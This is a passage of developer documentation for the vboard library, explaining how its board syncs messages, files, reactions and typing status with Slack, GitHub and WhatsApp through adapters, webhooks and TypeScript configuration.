   # 820 is ada's review comment on src/auth.ts:42 → re=812, replyTo=820
   # GitHub: posted into that inline review thread
   # Slack:  posted in the PR's thread, as written (no quote added)
   ```
4. **Review submissions and closing** arrive as replies, e.g. "approved by ada"
   or "merged by julian". They also update the root's `review` and `state`
   labels, so an agent can act on them:

   ```bash
   next=$(vb wait prs --label review=approved --json --timeout 1h) || exit 0
   # merge it, run release checks, post a reply…
   ```

A repo without the GitHub App can still announce PRs from an Action, as in the
CI walkthrough.

## Sync

Sync connects the board to platforms in both directions. Each entry is a sync
adapter for one platform account, keyed by a name you choose. It's configured
by the platform's own things: Slack channels, GitHub repos.

```ts
// app/api/board/[[...path]]/route.ts
import { board } from 'vboard'
import { a2 } from 'vboard/backend-a2'
import { slack } from 'vboard/sync-slack'
import { github } from 'vboard/sync-github'
import { redisHttp } from 'vboard/backend-a2/store-redis-http'
import { vercelQueues } from 'vboard/backend-a2/scheduler-vercel'
import { vercelBlob } from 'vboard/backend-a2/blob-vercel'

const backend = a2({
  store: redisHttp({ url: process.env.KV_REST_API_URL!, token: process.env.KV_REST_API_TOKEN!, keyPrefix: 'vboard' }),
  scheduler: vercelQueues({ topic: 'vboard' }),
  blob: vercelBlob(),                                     // without one, platform files come over as links
})

const team = board({
  backend,
  sync: {
    slack: slack({
      adapter: 'slack/basehub',                           // a Vercel Connect connector (see Adapters)
      channels: {
        '#errors-www': 'errors-www',
        '#firehose-www': 'firehose-www',
        '#prs': 'prs',
        '#alerts': async ({ event, board }) => {
          if (event.kind !== 'message') return
          const project = event.text.match(/project: (\S+)/)?.[1] ?? 'unknown'
          await board.sync(`alerts/${project}`, event)
        },
      },
    }),
    acme: slack({                                         // a second Slack workspace
      adapter: 'slack/acme',
      channels: { '#support': 'acme-support' },
    }),
    github: github({
      adapter: 'github/basehub',
      repos: {
        'basehub-ai/www': { pulls: 'prs', issues: 'issues' },
        'basehub-ai/docs': async ({ event, board }) => {
          await board.sync('prs', event, { labels: { area: 'docs' } })
        },
      },
    }),
  },
})
export const GET = team.fetch, POST = team.fetch
export const { scheduler } = backend
```

**Sync runs in `board()`, on any backend.** Its adapters, webhooks, and
deliveries run where `board()` does, and it keeps its records on the backend
through protocol routes every backend answers, each behind the `sync`
permission in the channel concerned, but for a person's own codes and
unlinking their own account:

| Method | Route | What it keeps |
| --- | --- | --- |
| `syncImport` | `POST /sync/imports` | a platform's write as its platform author, with its origin and sync key (null for a callback's own): `post` (idempotent by an ID derived from the platform event), or `edit`, `delete`, `react`, `labels`, `links` on the message the backend finds from its platform IDs or that it names by board ID, or `seen` (a platform user to know, for `@[email]`) |
| `syncReceipt` | `POST /sync/receipts` | `message.synced` (with `message.files_synced`), `message.files_synced`, `message.sync_failed`, or `thread.synced` with its `cause` |
| `syncThread` | `GET /sync/threads/:thread` | a thread's root, channel, targets, and external threads |
| `syncFind` | `GET /sync/find` | the board thread and message for platform IDs, the post an import made with a client ID, who an account is linked to and how, a person's accounts, whose a live code is |
| `syncCopies` | `GET /sync/copies` | messages' copies the caller's sync recorded, by target |
| `syncRoots` | `GET /sync/roots` | a person's recent roots, for the echo check |
| `inboxPush`, `inboxNext`, `inboxAck`, `inbox` | `/inbox/:key…` | platform events, deduplicated by platform ID, leased one platform thread at a time and in order; `inbox` lists them |
| `syncCode`, `syncAccount`, `syncUnlink` | `/sync/codes`, `/sync/accounts`, `/sync/accounts/unlink` | one-time codes, only for people, each for themselves; account links, only by a code; unlinking your own, or anyone's with `sync` in every channel |

Only these take provenance (an author, an origin) from a body, and only from a
caller with `sync` where it lands: `sync` says this project may speak for
platform users there. An author, or an account it links, is a user of a
platform the caller syncs (its own sync's entries, or those it registered),
never an ID the board authenticates (`vercel:`, `github:repo:`, `oidc:`,
`local:`, `vboard:`), nor a host's principal the board has seen register or
write, or its agents and registered watchers (`<principal>+<id>`). A caller
that pushes to an inbox pulls it back:
a2() delivers its own sync's in-process on `vboard-inbox` and queues anyone
else's in their registrant session. Outbound, sync is one of the board's
subscriptions, beside its watchers: a2() delivers it on `vboard-sync`'s thread
lanes, and a board on `http()` registers it (its sync entries) and pulls it as
matches of watcher `@sync`. On `a2()`, a root posted through `board()` lands
with its channel's config targets in the same batch; one that reaches the board
any other way, a root posted through a board on `http()` included, gets them
when sync sees it. Two syncers on one platform channel would
each import and each deliver: that's config's to avoid.

**Each mapping chooses a default mirror or an event callback:**

- **A board channel (string): a two-way mirror.** Incoming events use default
  imports. New board threads start external threads where supported, and replies,
  reactions, edits, and deletes flow through the connection automatically.
- **A function: a callback for every incoming event.** It receives `{ event,
  board, permalink }`, including for connected threads. Call `board.sync(channel, event)` to
  apply the default import, pass overrides, or use other board operations. Calling
  no default sync skips that event. Once connected, outgoing delivery is automatic.
  `permalink()` returns the platform's own link to the event's message, from
  `SyncProvider.permalink(event)`: fetched on the first call, reused for the rest
  of the callback, and forgotten after a failure so a retry asks again. It only
  reads the URL; nothing is imported or joined. The base provider returns `null`.
- **`{ channel, run }`: a callback with static reverse routing.** Incoming events
  go through `run`. The declared channel also lets new board-created threads find
  the external channel without executing the callback to discover routing.

**Entry keys** are names you choose, such as `slack` and `acme`, and the sync
adapter decides the platform. The key appears in external IDs
(`acme:C0999XYZ:…`), in `--sync` targets, and in the webhook path
(`/webhooks/<key>`).

**Mapping keys** can be names (`'#prs'`) or IDs (`'C0123ABC'`). Names are the
default.
- Slack events carry IDs, so names resolve through one cached channel listing.
- Each key resolves on its own. One that can't (a channel that doesn't exist
  yet, a missing scope) is logged and skipped, and retried at most once a
  minute; the rest sync.
- A name stops matching after a rename, on the next cold start. IDs survive
  renames.
- Each external channel or repo should appear at most once per entry. Nothing
  checks it: of two keys that resolve to the same channel, the later wins.

### Event callbacks and default imports

Function mappings receive every incoming event, including connected threads.
String mappings are shorthand for applying default imports to every event.

```ts
import { github, GitHubPayload } from 'vboard/sync-github'

// board({ sync: { github: repos } })
export const repos = github({
  adapter: 'github/basehub',
  repos: {
    'basehub-ai/vboard': async ({ event, board }) => {
      const channel = event.subject.type === 'pull_request' ? 'prs' : 'issues'
      await board.sync(channel, event, {
        labels: { area: 'vboard' },
        root: ({ raw }) => {
          const payload = GitHubPayload.parse(raw)
          const item = payload.pull_request ?? payload.issue!
          return { text: [item.title, item.body, item.html_url].filter(Boolean).join('\n\n') }
        },
      })
    },
  },
})
```

The event-taking `sync` overload exists only on a callback's `board`. It
accepts the current verified envelope, not a reconstructed object, and has no
HTTP counterpart: a sync elsewhere pushes platform events to its inbox
(`POST /inbox/:key`) and imports writes, and never submits an envelope. `board.sync(messageId, target)` retains its
thread-attachment meaning everywhere; the second argument tells the two apart,
a target string or the event.

- `text` replaces the event's generated message or reply. If a lifecycle event
  creates both a root and a reply, it replaces the reply; `root` controls that
  root's draft. Without a separate reply, `text` is the final override of the
  root's text, including text returned by `root`. It never manufactures a reply
  for a lifecycle event that only changes labels.
- `labels` merges into the root's labels; `unset` removes named keys. Normal
  platform reconciliation still applies on subsequent events unless overridden.
- `root` is a synchronous override for root creation, receiving default text,
  labels, author, and native data. It runs both for opening webhooks and roots
  recovered from early comments. Its labels merge into the default draft; top-level
  `labels` then takes precedence, and `unset` finally removes named keys, including
  keys added by `root`. The callback cannot change provenance or unset keys itself.
- `noSync` keeps an imported reply, or a lifecycle's reply, on the board: no
  other platform gets it. A new root always syncs.
- Calling no default sync skips that import event. It leaves the connection
  intact. Each callback can import its event once, and must await its operations.
- Callback retries retain trigger-derived write IDs. A default import that
  already succeeded returns its existing message, allowing later callback work to
  resume. Callbacks adding external I/O must make it idempotent themselves.

`board.sync` returns `{ root, message }`, message IDs as strings. `root`
identifies the board thread's root; `message` identifies the imported message,
the affected message for an edit/delete/reaction, or a generated lifecycle
reply. A root-only lifecycle
import returns its root as `message`; a label-only update returns `message: null`.
An event that cannot be applied returns null IDs where no board message exists.
One the middleware drops returns `message: null`, and what it responds goes to
the platform thread. Results stay the same when an import is retried after
succeeding.

Envelopes share a durable inbox event `id`, platform, sync key, channel, grouped thread, precise subthread,
and raw payload fields, plus the complete normalized operation. Message text,
authors, files, and reaction data belong to their applicable variants. GitHub
adds `subject: { type: 'pull_request' | 'issue', repo, number }`, including on
comments, edits, and reactions. Its lifecycle union narrows native PR/issue data
by `type`. Envelopes are validated and frozen before application callbacks.
`event.id` stays the same on callback retries and can serve as an idempotency key
for the callback's own service calls.

A bare function chooses a board channel at import time; the board cannot infer
reverse routing for a new board-created thread from that function. A mapping may declare both a channel and a callback:

```ts
// in slack({ adapter: 'slack/acme', channels: { … } }):
'#support': {
  channel: 'support',
  run: async ({ event, board }) => { await board.sync('support', event) },
},
```

That preserves automatic Slack thread creation from board roots. Incoming events
still pass through the callback. Outgoing delivery continues through the existing
connection; these callbacks do not run for every outgoing message.

### Outgoing presentation

Each provider accepts a synchronous `render` function, or a subclass can override
its `render` method. It receives immutable copies of the board message (its text in the readable
form for known bot messages) and actor,
the default author label, the actual resolved destination, and
`mentionOf(actor)`, which returns an actor's native mention there through linked
accounts, or null. It returns the
message body as markdown; vboard still adds attachment notes.
The board's stored message and verified author are unchanged. Resolved mentions
are converted to the destination's native form in the rendered body, after the
custom renderer runs; code spans retain their usual treatment.

```ts
kapso({
  adapter,
  markRead: (input) => client.messages.markRead(input),
  numbers: { '16315558151': 'support' },
  render: ({ message }) => message.text,
})
```

This omits author attribution from WhatsApp delivery. Rendering is used for roots,
replies, backfills, edits, and attachment fallback. Media-only output sends media
without inventing a caption and records both copy and file receipts. An empty
body without media is a delivery error. Renderer changes affect future rendering,
including pending work and retries; they do not rewrite already delivered copies.

A renderer can read the message's labels. When a label change changes what a
delivered copy renders to, vboard edits that copy, so a PR root can show its
state. The default renderer reads no labels, so labels alone never edit a copy.

### The rules

1. **Delivery.** Every message, edit, delete, and reaction in a thread goes to
   every external thread the thread is synced with, except those under the
   sync key it came through: a reply from `slack:C1` doesn't reach the
   thread's `slack:C2` copy either. Messages written with `noSync` stay on the
   board. Where a platform doesn't
   support something, that delivery is skipped.
2. **Starting a thread.** A root posted on the board, including one posted by a
   watcher, starts threads in its channel's mirrored channels, on every platform
   that can start threads in a channel. Slack can; GitHub and WhatsApp can't.
   `sync` targets are added on top, and `noSync` drops the mirrored channels.
3. **Inbound events.** A platform event is handled if its thread is already
   synced with a board thread, in which case it becomes a reply, reaction, edit,
   or delete. It's also handled if its channel or repo is in config, in which
   case it goes to the mirror or to your function. Anything else is ignored,
   even in channels the bot belongs to.
4. **Targets are resolved once, when a root is appended.** They're written as
   `thread.synced` events in the same batch as the root, or, for a root that
   reached the board another way, as sync sees it. A deploy that changes the
   mappings affects new threads only, and it can't reinterpret pending sync
   work. A2 stores resolved lanes on events for the same reason.
5. **Attaching an existing thread.** `sync <id> <target>` appends
   `thread.synced`. For a channel target, the outbound consumer then posts the
   root and backfills its replies, in order, on the thread's lane. A thread
   target receives only messages written after the join (see
   [The sync events](#the-sync-events)).
6. **Grouping external threads.** Each sync adapter decides which board thread an
   external thread belongs to. The GitHub adapter groups inline review threads
   (`…:123:rc:*`) under their PR (`…:123`).
7. **Reply targets.** If a reply's `replyTo` message came from a platform's
   sub-thread, the reply goes into that sub-thread on that platform. Elsewhere
   it goes into the main thread as written: vboard adds no quote of the message
   it answers. An author who wants one writes it into the text.

### Inbound handling

1. `POST /webhooks/:key`, a `board()` route, calls the provider's `receive`,
   which authenticates the request and emits normalized events. The built-in
   providers use Chat SDK.
2. Sync pushes each event to the backend's inbox (`inboxPush`), with the
   platform's ID for it, which dedupes it. On a2(), its own sync's land as
   `external.received` in the inbox session for that external channel
   (`inbox:<key>:<channel>`). It answers 200 right away. That's well inside
   Slack's 3-second retry window, and platform retries do nothing.
3. On a2(), the inbound consumer, `vboard-inbox`, hands each event back to
   `board()`'s sync on the external thread's lane, and sync runs the mirror or
   your function. On a board on `http()`, the deployment that pushed them pulls
   them back right after (`inboxNext`, then `inboxAck`), one platform thread at
   a time and in order. Its writes are imports (`syncImport`) on the board
   that keeps the log.

The `board` a function receives has the handle's methods, but not `fetch` or
`as`, plus its own `sync`. Only how it reaches the board and its defaults
differ:

- **Its calls reach `board()` in process,** with no token. `board()` then calls
  the backend as sync: on `http()`, a request to the board it uses, with this
  deployment's credentials.
- **Writes are authored by the platform actor that triggered the event,** for
  example `slack:user:U0456`, with `origin` set from the event for the import.
  The function's own writes (`post`, `reply`, `label`, `react`, and `edit` and
  `delete` of the actor's own messages) are imports too, `syncImport` as that actor
  with `from: null`, naming a message by its board ID: they sync out like a
  message written on the board, and work the same on every backend. Its reads,
  and anything else it does, are sync's own caller's.
- **Write IDs are derived from the triggering event and the call order,** the
  same way A2 names a consumer's own appends. A retried function doesn't post
  twice as long as it makes its writes in the same order. Writes made in
  parallel, e.g. with `Promise.all`, need explicit `id`s.

**Failure:** on `a2()`, a function that keeps throwing dead-letters after 10
tries. That blocks only its thread's lane in that channel's inbox. Other
threads, other channels, and the board log itself keep flowing. Without a
scheduler, a retry waits for the next event in that inbox session. On a board
on `http()`, sync gives an event up after 5 tries, and its thread moves on.

A retried function can produce a different write under the same derived ID,
for example if mentions resolved differently the second time. The board finds
the post that landed under that ID and returns it, so the first one stands; the
same ID in another place is 409 `duplicate_id`.

**Files come in, too.** A platform message's files are stored with it, so a
screenshot pasted in Slack is a board attachment like any other. Intake keeps
only what the adapter needs to fetch each file later (Chat SDK's
`fetchMetadata`), not the bytes. As it imports the message, `board()`'s sync
fetches each file through the adapter's `rehydrateAttachment` and uploads it,
on any backend. Any Chat SDK adapter that implements it works, with no
platform code in vboard; Slack needs `files:read`. A file that can't come
over gets a line in the text instead, and the message still lands:
`📎 run.mov (50.0 MB) didn't come over: over 25 MB`. That covers files over
25 MB (or, on `http()`, over what the board elsewhere takes), empty files, files past a message's 10, and an adapter that can't
fetch. A fetch that fails is tried 3 times first, so one bad file can't stop
its thread. On a board that keeps no files (no blob store), each file comes
over as a link to where it lives, one line each:
`📎 [shot.png](https://files.slack.com/…) (7 B) didn't come over: this board keeps no files`,
or its name alone when the platform gave no URL.
A platform edit keeps those lines (the platform's text never had them), a
message with files stays empty when its text is, and an edit that leaves the
text as it was writes nothing.
Files on an edit aren't brought in, and an inbound function gets the
platform's event as it is.

Some limits of the import. When a platform doesn't report a file's size
(Slack always does), the 25 MB check happens after the download. Each attempt
uploads its files under fresh random IDs. So a retry, whether a later file's
fetch failed or the post itself did, leaves the earlier attempt's uploads as
orphans in the blob store. That's harmless, since nothing names them, but it
isn't cleaned up. A failing blob store isn't a file's fault, so it isn't
capped at 3 tries: the message retries until the store recovers, or until it
dead-letters and holds up its thread's lane.

### Outbound handling

- **On each board write in a synced thread**, sync, which gets every post,
  change, and thread sync as a subscription, calls the provider's methods:
  post, react, edit, or delete. It then records `message.synced` as a receipt
  (`syncReceipt`), so later edits and reactions can find the platform's copy.
  On a2() the subscription runs on the `vboard-sync` consumer, and a receipt
  is that consumer's own append. A post or an edit renders the message as it
  is when it goes out, read again then: one that goes late (a backlog, a
  retry) sends what its author has since edited, and nothing they deleted.
  Each sync delivers only to its own keys' targets.
- **Attachments go where a platform takes them.** Slack gets the files
  themselves: the text posts first, and its receipt is recorded, then the files
  upload into the same thread as a message of their own, and
  `message.files_synced` records Slack's IDs for them. So a failed upload
  retries alone, without posting the text twice, and deleting the message on
  the board deletes the files on Slack too. If Slack refuses files (say, the
  app lacks `files:write`), the text is edited to add a line per file
  (`📎 after.png (17 KB, on the board: #812)`), and later edits keep them.
  Slack picks a file's type from its extension and shows any it doesn't know
  (`.log`, `.ndjson`, none) as a binary download. So a text file with such a
  name goes to Slack with `.txt` appended (`deepsec.log.txt`), which Slack
  previews; the board keeps the file's own name.
  GitHub has no upload API, so it always gets those lines. A board that keeps
  no files (one whose blob store was taken away) sends none: the text gets
  those lines instead.
- **Echoes are skipped.** The bot's own messages are skipped on the way in, so
  nothing echoes back. On GitHub, the adapter needs the app's bot user ID to
  recognize its own comments, or it replies to itself in a loop; with a
  connector, vboard looks it up (below), and `botUserId` pins it. A copy posted as a person comes back as theirs, so it's
  recognized by its receipt instead; one that arrives before its receipt is
  held back, for up to 5 tries while the board message is under a minute old,
  rather than imported twice. That
  includes a new thread they started, whose platform thread the board learns
  only from the receipt: a message from them in that channel waits while one of
  their roots there is still pending.

### Posting as people

A board message a person writes reaches Slack or GitHub *as them*: their name,
their avatar, no "via" label, and the platform's own notifications. It takes
their own platform token, which they grant by signing in (`vb identity link
<key>`), and the same sign-in links the account (see
[Linked accounts](#linked-accounts)).

```ts
type UserTokens = {
  authorize(principal: string, options?: { callback?: string }): Promise<string> // a sign-in URL binding whoever completes it to `principal`, back to `callback`
  token(principal: string): Promise<string | null>    // their token, or null when they haven't signed in
}
```

- **Where tokens come from:** a connector name uses Vercel Connect's user
  tokens (`startAuthorization` / `getToken` with `subject: { type: 'user', id:
  principal }`). Your own OAuth is `withUserTokens(adapter, { authorize, token })`.
- **The board never stores a token.** It asks for one at each delivery. No
  token (never signed in, revoked, expired), an error getting one, or a
  platform that refuses the post (a missing scope) delivers as the app, as
  before: posting as a person never fails a delivery.
- **Only once the account they signed in with is linked** (`method: 'consent'` on
  that platform): a token alone isn't enough. So their copy's echo is
  recognized as theirs, and `vb identity unlink` stops posting as them even
  though the platform still has the token. Edits and deletes of copies already
  posted as them still use the token.
- **Only what they wrote on the board themselves.** Their agents
  (`claude via julian`) keep posting as the app, so you can tell them apart.
  Imported messages go out as the app, never as anyone, and so do messages
  from anyone who isn't a Vercel user (`vercel:user:`).
- **The text is theirs:** no name in front, and no custom `render`. Files still
  upload as the app.
- **Edits and deletes of a copy posted as them use their token too**
  (`message.synced` records `asUser: true`): the app can't change their
  message. Without their token, they're skipped.
- **Slack** posts through the adapter with the person's token
  (`withBotToken(token, …)`): the user scope `chat:write`. **GitHub** posts
  through its REST API with the person's token, not the adapter, which would
  learn the person as its own bot user. The GitHub App needs user authorization
  turned on, with Issues and Pull requests write.

### Typing

`POST /messages/:id/typing`, `board.typing(id)`, or `vb typing <id>` shows
typing in the platform threads the answering board's sync delivers the
message's thread to, through the adapter's `startTyping`: on `a2()`, the sync
that runs beside it. On a board on `http()`, its own code's call also shows it
where its own sync does. It's ephemeral: nothing is written to the log, and it
isn't synced or replayed.

- **Best-effort,** like edits and reactions: a platform that fails is skipped
  and logged, and the response's `targets` lists the external threads that took
  it. An unsynced thread answers `{ targets: [] }`.
- **WhatsApp** shows "typing…" and marks the latest inbound message read (blue
  ticks). The adapter only remembers messages whose webhook reached its own
  instance. Pass `markRead: (input) => client.messages.markRead(input)` to
  `kapso()` to use the board's latest message through a public SDK client across
  serverless instances. This operation is required at setup.
- **Slack** sets the thread's assistant status, which shows under the thread,
  in channel threads too, until the app posts or about two minutes pass. An
  optional `status` (up to 100 characters: `vb typing <id> "running tests…"`)
  replaces the default "Typing…". WhatsApp ignores the text. **GitHub** has no
  typing, so it's a no-op.
- It needs `post` and `read` in the thread's channel.

### Adapters

`adapter` takes a Vercel Connect connector's name, or a Chat SDK adapter, like
the AI SDK's `model` takes a string or a provider:

```ts
// Vercel Connect: no platform secrets anywhere, and nothing else to install or wire
adapter: 'slack/basehub',
adapter: 'github/basehub',

// plain Chat SDK: an app you created, secrets in env
adapter: createSlackAdapter({
  botToken: process.env.SLACK_BOT_TOKEN!,
  signingSecret: process.env.SLACK_SIGNING_SECRET!,
}),

// plain Chat SDK, posting as people through your own OAuth
adapter: withUserTokens(createSlackAdapter({ ... }), { authorize, token }),
```

- **A connector name** makes vboard build the adapter
  (`createSlackAdapter({ ...connectSlackAdapter(name) })`), Slack's Web API
  `client` resolver, and people's sign-in through the same connector (see
  [Posting as people](#posting-as-people)). `chat`, `@chat-adapter/slack`,
  `@chat-adapter/github`, and `@vercel/connect` are vboard's own dependencies,
  so the app installs none of them. On GitHub, Chat SDK can't detect the
  app's bot user from Connect's installation token (REST's `/user` refuses it),
  so vboard asks GraphQL's `viewer`, which answers for that token, once per
  instance. `botUserId` skips the call.
- **An adapter** is used as given. It posts as the app unless it's wrapped in
  `withUserTokens` (from `vboard/sync-slack`, `vboard/sync-github`, or
  `vboard/sync`).

With a Slack adapter of your own whose bot token is async (Connect's
credentials passed to `createSlackAdapter`, say), `slack()` needs a public
`client` resolver, for name lookups, joining, avatars, email lookups, link and
on-demand reads, permalinks, agents' names, and file deletion. The resolver
gets the bot token and returns `adapter.withBotToken(token, () =>
adapter.webClient)`. vboard never calls the SDK's protected token resolver.
Static-token adapters can use their public `webClient` directly. An
async-token adapter without a resolver fails at setup. A connector name needs
none: vboard builds it.

With Connect:
- `botToken` becomes a function that mints a short-lived token per call.
- `webhookVerifier` accepts only Vercel OIDC tokens for this deployment's
  project and environment, and it rejects every request when those values are
  missing.
- The board then holds no long-lived secrets: every credential that reaches it
  is an OIDC token.

Connect is generally available, and plain configuration remains fully
supported.
- A Connect connector can forward to at most three trigger destinations, for
  example production, staging, and one more.
- Connect retries deliveries that receive a 5xx response up to three times.

**The layers:**

```
@vercel/connect/chat   credentials   botToken() per call, webhookVerifier (Vercel OIDC)   (optional)
@chat-adapter/*        protocol      parse platform events, call platform APIs
chat                   runtime       one Chat instance per provider, created by vboard
vboard/sync-<platform> sync adapter  entities, event types, thread grouping, rendering
vboard                 the board     sync's engine in board(), on any backend; Chat state in memory
```

vboard never stores platform credentials: it asks for a token at each call.
Webhooks skip the board's token check, because platform requests can't carry a
board token; the adapter authenticates them instead. Sync's sign-in pages
(`/identity/sign-in`, `/identity/signed-in`) skip it too: a browser opens them
with only a code.

### Setting up webhooks

**The board itself needs no setup.** Every `sync` entry gets its route,
`/webhooks/<key>`, automatically. The setup happens on the platform, once per
entry and deployment, in one of two ways.

**With Vercel Connect.** Register a trigger destination, either in the dashboard
(Connect → the connector → Triggers → Add Trigger Destination: project, target,
path) or from the CLI:

```bash
vercel connect create slack --name basehub-slack --triggers
vercel connect attach slack/basehub-slack --project www --triggers --trigger-path /api/board/webhooks/slack
```

A destination targets production, a preview branch, or a custom environment.
Each connector allows up to three.

**DIY, without Connect.** Create the app on the platform yourself and point it at
the board. The adapter then uses plain configuration from env:

- **Slack:**
  1. Create an app, from a manifest if you like.
  2. Set its Event Subscriptions request URL to
     `https://<host>/api/board/webhooks/slack`.
  3. Subscribe to the bot events `message.channels`, `message.groups`,
     `reaction_added`, and `reaction_removed`.
  4. Grant the scopes `channels:history`, `channels:read`, `channels:join`,
     `groups:history`, `groups:read`, `chat:write`, `chat:write.customize`,
     `reactions:read`, `reactions:write`, `users:read`, `users:read.email`,
     `files:read`, and `files:write`.
  5. Install the app, then set `SLACK_BOT_TOKEN` and `SLACK_SIGNING_SECRET`.
- **GitHub:**
  1. Create a GitHub App with its webhook URL set to
     `https://<host>/api/board/webhooks/github` and a webhook secret.
  2. Give it the permissions and events listed under [GitHub](#github), and
     install it on the repos you map.
  3. Pass the App's ID, private key, and webhook secret to the adapter.
- **WhatsApp, through Kapso:** see [WhatsApp (Kapso)](#whatsapp-kapso).

Both paths end at the same route. The only difference is who verifies the
webhook: Connect's OIDC verifier, or the platform's own signature check.

### Sync providers

`vboard/sync` exports `SyncProvider`, shared schemas, and callback/import types.
The engine calls the provider's methods; it does not access an SDK adapter or
transport configuration. A provider can implement its own SDK integration or
extend `ChatSyncProvider` from `vboard/sync/chat`. Slack, GitHub, and Kapso share
that bridge. Importing the native contract does not load Chat SDK.

```ts
import { SyncProvider, type Receive } from 'vboard/sync'
import { ChatSyncProvider, type ChatInput } from 'vboard/sync/chat'
```

The required methods are `receive(key, request, emit)`, `resolveChannel(key)`,
`resolveTarget(target)`, `post(target, kind, body)`, and `event(context)`.
`receive` authenticates the request before emitting normalized
`{ event, raw, dedupe }` records. Incoming locations have the configured sync
key prefix. Outgoing targets passed to provider methods are native IDs, without
that prefix. `post` returns native `{ thread, message, files? }` receipt data.
The engine validates incoming records, persists them before acknowledging,
orders imports and delivery, handles retries and echo suppression, and records
copy/file receipts. Intake failures answer 500 so the sender can retry.

The provider supplies stable occurrence identity in `dedupe`. Repeated delivery
of the same occurrence must keep its ID, while a later identical action must
have a different one. The Chat bridge's `eventId(key, input)` can be overridden
for native delivery IDs; its default handles messages, edits, and deletes.
Providers receiving reactions must supply their occurrence identity. Slack uses
`event_ts`; Kapso uses the reaction message's `id`. There is no current-time
fallback. Existing built-in inbox and receipt ID schemes are retained.

Target resolution returns `{ target, channel, kind: 'channel' | 'thread' }`.
The server records target kind in `thread.synced` and the resolved incoming
origin channel; reducers and reverse routing do not interpret a new provider's
ID syntax. Older records retain their legacy parsing. Channel attachment is
rejected when `canStartThreads` is false; existing thread attachment still works.

Optional methods provide missing-root recovery, file downloads and uploads,
native mentions, email lookup, link snapshots (`fetchLink`), on-demand reads
(`read`), permalinks, posting as a person (`whoAmI`, `postAs`, `editAs`,
`deleteAs`), edits, deletes, reactions, and typing. Defaults for absent
change/typing operations are no-ops. `uploadsFiles` declares upload support;
otherwise files get board attachment notes. `refusesFiles` distinguishes a
permanent upload refusal from a retryable failure. Providers also declare
reaction cardinality. All of these operations can be overridden as class methods;
Chat-specific hooks remain inside the bridge.

`SyncProvider` owns common mapping dispatch. Its `sync(context, channel,
overrides)` default applies the validated internal operation directly, without
projecting a callback envelope. A subclass needing richer native data can call
`this.event(context)` explicitly. Envelopes are projected, validated, and frozen
only for application callbacks. Subclasses can override `render(input)` or pass
a renderer in their constructor options. Durable state belongs on the board,
through its backend; SDK caches and credentials remain provider dependencies.

The same provider contract tests run against a native implementation and a Chat
SDK bridge implementation. They cover authentication, duplicate delivery,
distinct add/remove/add occurrences, callback and outgoing retries, stable
callback IDs, concurrent entry contexts, opaque URL-like targets, static reverse routing, unsupported
channel creation, thread attachment, and file fallback. The existing built-in
suites cover GitHub lifecycle results across retries, media receipts, native
mentions, and cross-instance Kapso read/typing.

### Chat SDK configuration (internal)

vboard configures every Chat instance itself:

- **`concurrency: 'concurrent'`.** Chat SDK's default is `drop`: a message that
  arrives while the thread's handler is still running is dropped, which would
  lose replies sent in quick succession. Ordering comes from the inbound lane
  instead.
- **One Chat instance per provider.** `slack()`, `github()`, and `kapso()`
  each make one, with one adapter, so two Slack entries never share one and
  collide on `slack:`. vboard translates between Chat SDK IDs and its
  key-prefixed external IDs; a provider used under two keys takes each
  webhook's key from the request it's handling.
- **Chat state is ephemeral.** The board's inbox gives each platform event its
  durable identity, by the provider's `dedupe`, and the board's sync records
  hold sync state, on any backend. Chat SDK uses an in-memory state adapter for
  best-effort caches:

  | What Chat SDK uses state for | What replaces it |
  | --- | --- |
  | Dedupe of webhook retries | the inbox's deduplication by platform ID (on `a2()`, deterministic `external.received` event IDs) |
  | Thread subscriptions | Never called. A match-all `onNewMessage` sees messages in unsubscribed threads, and the entry's mappings and the board's sync records (`GET /sync/find`) decide what's synced |
  | Locks and queues | Unused under `concurrent` |
  | Caches | Kept in memory, best-effort |

### Slack

`slack({ adapter, channels })`. Keys are Slack channels, by name (`'#prs'`) or
ID (`'C0123ABC'`).

**A function receives `{ event, board, permalink }`.** The shared envelope includes:
- `text`
- `author`
- `channel`
- `thread`, the target that `sync` accepts
- `raw`, the Slack payload

`permalink()` calls `chat.getPermalink` with the provider's client, so the link
has the workspace's own host (Enterprise Grid included) and a reply's
`thread_ts`. It's `null` for a delete event, whose message Slack no longer
has; any Slack refusal throws, and the callback retries.

**Setup:**

```bash
vercel connect create slack --triggers
vercel connect attach … --triggers --trigger-path /api/board/webhooks/slack
```

Slack only sends a channel's events to apps in it. When a mapped channel
resolves, the app joins it if it's public (`channels:join`). Private channels
need someone to `/invite` the app; the log names each one. Name lookups need
`channels:read`. Private channels also need `groups:read`; without it (Vercel
Connect's Slack app doesn't request it), map a private channel by its ID.

**Agents post under their own names.** A message from an agent profile
(`clever-lemur via vboard-factory`) goes to Slack with that name as the
message's sender, and the `**name**: ` label it would open with is left out.
Its avatar is the agent's own picture when it's an https image Slack can show.
An agent with the board's built-in SVG avatar shows its person's Vercel avatar:
the picture the person's CLI sent on their own messages, or else
`vercel.com/api/www/avatar?u=<handle>`. Without either, the agent keeps the
app's icon. This
needs `chat:write.customize`, which the board checks once with `auth.test`;
without it, agents post as the app with the label, as everyone else does. An
edit leaves the label out only where Slack shows the message under the
agent's name. People's messages, and messages with files, post as the app.

**Message links.** A Slack permalink in a message (`…/archives/C0123/p…`)
becomes one of the message's `links`; its text stays as written. A link to a
message the board has (it was synced, either way) in the same board channel is
that board message, `#id`, with a snapshot of it. One in another channel isn't
(sync reads every channel, and the link's readers may not), and an earlier
version's board snapshot never carries over. Otherwise the snapshot comes from
Slack's unfurl: in the
message event if Slack sent it there, or in the `message_changed` that follows,
which Chat SDK drops and the provider reads itself. With no unfurl yet, the
board reads the message with `conversations.replies` (`channels:history`), but
only from a public channel the app is already in. The app's token reads what the
app can, not what the person who posted the link can, and every board reader
sees the snapshot, so private channels and DMs are left to Slack's unfurl, which
checks the poster. The app doesn't join a channel to read a link. A link the
board can't read keeps why (`private_channel`, `not_in_channel`) until an
unfurl fills it in; an unfurl of one link keeps the others as they were. A
forwarded message is a link too: Slack sends it only as an `is_share`
attachment, whose snapshot is the shared message. A forward with no text of its
own imports as that message quoted (`> **Ada**: …`) with its permalink below. `vb read` and `vb inspect` quote each one under the message. Snapshots
are what the message said when the link arrived; its files are linked, not
copied.

**Reading on demand.** `GET /sources/:key/read` (`readSource` on the handle),
on the board that runs the entry, reads a channel (`#name` or `C0123`, newest 50 by default, shown oldest first),
a thread (`C0123:1727000000.123456`, or a reply's ts, which reads the thread
it's in), or the thread a message permalink is in, for research and references:
an agent can read a channel the board doesn't sync. `more` says the platform had
more than `limit`, which is at most 200 (older messages in a channel, later
replies in a thread). It has a link's limits, and also refuses Slack Connect channels:
public channels the app is already in, through `conversations.history` and
